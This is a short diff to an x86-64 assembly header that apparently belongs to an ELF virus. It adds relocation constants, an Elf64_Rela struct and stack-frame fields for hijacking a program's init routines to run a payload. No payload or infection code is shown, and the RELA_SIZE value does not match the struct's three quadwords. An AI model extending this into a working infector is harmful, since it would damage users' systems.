@@ -103,6 +103,7 @@ endstruc
 
 %define SHT_PROGBITS    1
 %define SHT_NOBITS      8
+%define SHT_RELA        4
 %define SHT_INIT_ARRAY  14
 %define SHT_FINI_ARRAY  15
 
@@ -125,8 +126,17 @@ struc       Infection_stack_frame ; Not really a structure but it will help to c
     old_init_func:          resq    1
     payload_base_address:   resq    1
     payload_base_offset:    resq    1
+    init_rela_entry:        resq    1
 endstruc
 
-%define STACK_FRAME_SIZE    0xb0
+%define STACK_FRAME_SIZE    0xc0
+
+struc       Elf64_Rela
+    r_offset:       resq    1
+    r_info:         resq    1
+    r_addend:       resq    1
+endstruc
+
+%define RELA_SIZE   0x30
 
 %endif
